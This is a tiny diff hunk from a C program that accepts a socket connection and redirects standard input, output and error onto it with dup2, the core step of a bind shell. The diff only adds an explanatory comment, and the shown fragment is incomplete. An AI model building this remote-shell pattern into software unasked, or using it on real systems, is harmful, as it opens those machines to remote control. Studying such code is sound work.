@@ -29,6 +29,7 @@ int main()
 	// Accept connections
 	int connfd = accept(sockfd, NULL, NULL);
 
+	// Redirect the STDIN, STDOUT and STDERR into the socket
 	for (int i = 0; i < 3; i++)
     {
         dup2(connfd, i);
